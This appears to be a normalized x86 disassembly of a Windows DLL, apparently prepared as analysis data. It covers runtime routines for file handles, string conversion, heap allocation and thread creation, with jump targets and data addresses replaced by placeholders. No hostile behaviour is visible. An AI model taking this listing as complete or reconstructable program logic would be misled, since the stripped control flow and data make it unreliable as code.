cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x2 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push 0x4000000
push 0x3
push 0x0
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xc4 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ esi + 0x6c ]
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_100449d0
test eax eax
je r-xdata
mov ecx [ esi + 0xc0 ]
mov edx [ esi + 0xd8 ]
push ecx
call edx
mov [ esi + 0xc0 ] edi
pop edi
pop ebx
mov eax 0x3
pop esi
retn
pop edi
pop ebx
xor eax eax
pop esi
retn
mov eax [ esi + 0x88 ]
lea ebx [ esi + 0x78 ]
push r--data
mov ecx ebx
call sub_100449d0
test eax eax
je r-xdata
mov eax [ esi + 0xa4 ]
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_100449d0
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0x88 ]
jb r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0xa4 ]
jb r-xdata
mov ecx [ esi + 0xcc ]
push eax
mov eax [ esi + 0xc4 ]
push ebx
push 0x2b
push eax
call ecx
test eax eax
jne r-xdata
mov ebx [ ebx ]
mov edx [ esi + 0xc4 ]
push eax
mov eax [ esi + 0xcc ]
push ebx
push 0x2c
push edx
call eax
test eax eax
jne r-xdata
mov ebx [ ebx ]
pop edi
pop ebx
mov eax 0x4
pop esi
retn
pop edi
pop ebx
mov eax 0x5
pop esi
retn
sub_10040d60
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov [ eax ] edx
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
retn
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov [ eax ] edx
retn
sub_10040dc0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi + 0x34 ] 0x10
lea eax [ edi + 0x20 ]
jb r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
push ecx
push eax
lea edx [ esi + 0x122 ]
call sub_1003ac10
mov edx [ esi + 0x14 ]
add esp 0x8
mov [ edi + 0x380 ] edx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ eax ]
sub_10040e00
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push edx
call sub_10042f60
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10033f90
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_10040e4b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10040ee0
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
lea ebx [ eax + ebx * 2 ]
cmp eax ebx
jae r-xdata
mov eax 0xffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
mov eax 0xffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
sar eax 0x1
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov ax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_10040f50
push ebp
mov ebp esp
push 0xffffffff
push sub_1008800a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
sete cl
mov [ ebp - 0x18 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax ebx
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x24 ]
push ebx
push esi
push eax
call edx
cmp eax esi
jne r-xdata
mov edx 0x4
jmp r-xdata
mov esi eax
call sub_1006d8e0
mov [ ebp - 0x14 ] 0x4
cmp edx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_1004131f
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_1003a960
push 0x0
call sub_10039ae0
or eax 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
sub_1004100b
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_10039ae0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_100410b0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
mov cl 0x1
push edi
mov [ ebp - 0x4 ] cl
jne r-xdata
mov edi esi
mov [ ebp + 0x10 ] edi
test cl cl
je r-xdata
mov edi [ edx + 0xc ]
mov eax [ edi + 0xc ]
push edx
cmp eax [ edx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x4 ]
lea ecx [ ebp + 0x10 ]
cmp esi [ eax ]
jne r-xdata
cmp edi [ eax + 0xc ]
setb cl
cmp [ eax + 0xc ] edi
setae cl
jmp r-xdata
call sub_1000a86e
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
push esi
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov ecx ebx
call sub_100445b0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_10040d60
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edx
push esi
push 0x1
push ecx
mov ecx ebx
call sub_100445b0
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] cl
test cl cl
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10041181
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_1006e175
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_1005f1fb
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
push edi
push eax
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0xc ]
call sub_10030f03
mov ebx eax
xor eax eax
add esp 0x18
cmp ebx eax
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f580
add esp 0xc
jbe r-xdata
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
call sub_10030f03
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_1001b2d2
pop ecx
mov ecx [ ebp + 0x14 ]
movzx ecx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_10041241
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_100412aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_100590b0
add esp 0xc
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov ecx [ ecx ]
pop ebp
retn 0xc
sub_10041330
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xf4 ]
lea edx [ ebp - 0xf8 ]
mov esi ecx
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_1003a120
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x74
mov [ ebp - 0xfc ] ebx
call sub_1002f620
lea ecx [ ebp - 0xfc ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
mov eax 0x104
call sub_1002f620
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x4c ]
mov eax 0x96
mov [ ebp - 0xf0 ] ebx
call sub_1002f620
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x81
call sub_1002f620
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x60 ]
mov eax 0x63
mov [ ebp - 0xec ] ebx
call sub_1002f620
lea edx [ ebp - 0xec ]
push edx
lea eax [ ebp - 0x60 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x90
call sub_1002f620
push 0x20
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x3f
call sub_1002f620
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor eax eax
fldz
mov [ eax + 0x4 ] ebx
fstp [ eax + 0x10 ]
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x12
call sub_1002f620
mov ebx ecx
mov edi eax
call sub_10023100
xor ebx ebx
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
mov esi [ ebp - 0xe8 ]
mov [ esi ] eax
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0xaa
call sub_1002f620
mov ecx [ ebp - 0xe8 ]
mov edi [ ecx ]
mov ebx eax
call sub_10007910
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x5c
call sub_1002f620
mov edx [ ebp - 0xe8 ]
mov edi [ edx ]
mov ebx eax
call sub_100618f0
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xfc ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0xeb
call sub_1002f620
fldz
mov ecx [ esi ]
fstp [ ecx + 0x10 ]
push eax
call sub_1005ac37
mov eax [ esi ]
fstp [ eax + 0x10 ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x3d
call sub_1002f620
mov eax [ esi ]
mov [ eax + 0x18 ] ebx
push eax
call sub_1005ac37
fnstcw [ ebp - 0xe6 ]
movzx eax [ ebp - 0xe6 ]
mov edx [ esi ]
add esp 0x4
or eax 0xc00
mov [ ebp - 0x100 ] eax
fldcw [ ebp - 0x100 ]
fistp [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
mov [ edx + 0x18 ] eax
fldcw [ ebp - 0xe6 ]
jmp r-xdata
mov eax [ ebp - 0xec ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_100415d1
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005aa2b
int3
pop ebp
jmp eax
sub_100415fe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10068d25
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10041625
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10057921
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_100579de
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1007fa40
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1007fa40
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_1001b2d2
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_100579de
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1001b2d2
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
add edi 0x4
sub_1004171f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_100650d7
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004174a
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10066b6a
jmp r-xdata
sub_100417e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
add eax eax
add eax eax
push eax
push ecx
call sub_10013bb0
add esp 0x8
mov [ esi ] eax
pop esi
pop ebp
retn
sub_10041820
push ebp
mov ebp esp
push 0xffffffff
push sub_10088508
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebx + 0x10 ]
push r--data
xor edi edi
mov ecx ebx
call sub_100449d0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov ecx [ esi ]
push edx
lea esi [ ebp - 0x2c ]
call sub_1003d800
add esp 0x4
push eax
mov ecx ebx
mov [ ebp - 0x4 ] edi
call sub_10033f90
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
sub_100418b2
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004ad92
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10041990
push ebp
mov ebp esp
push 0xffffffff
push sub_1008977c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi edx
mov [ ebp - 0x10 ] 0x0
test esi esi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
lea eax [ edx + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x1
jne r-xdata
push 0x90
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
push 0xc8
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebx ]
mov ebx [ edi ]
push ecx
push eax
mov ecx esi
call sub_1003f3d0
jmp r-xdata
cmp eax 0x3
jne r-xdata
push 0xb0
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov edx [ ebx ]
mov ecx [ edi ]
push edx
push esi
mov edx eax
call sub_1004f090
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x10 ]
cmp edx eax
jae r-xdata
push 0xb8
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov ecx [ ebx ]
mov ebx [ edi ]
push ecx
mov ecx esi
call sub_1000d880
jmp r-xdata
test eax eax
je r-xdata
mov eax rw-data
call sub_1000c5c0
mov eax [ rw-data ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ rw-data ]
jne r-xdata
mov edx [ edi ]
mov ecx [ ebx ]
push edx
push ecx
push esi
push eax
call sub_10044f60
jmp r-xdata
push 0x0
add eax 0x4
push 0x0
mov [ rw-data ] eax
mov eax [ ebp - 0x10 ]
push eax
push sub_1000fce0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4c ] eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
test eax eax
je r-xdata
mov eax rw-data
call sub_1000c5c0
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov ecx [ ecx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ rw-data ]
sub_10041c4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_10030f53
mov ecx [ ebp + 0x1c ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_10063545
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_10063545
add esp 0x10
test eax eax
js r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f580
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov ebx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10041d4c
push 0x80
mov eax sub_100855be
call sub_10047689
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
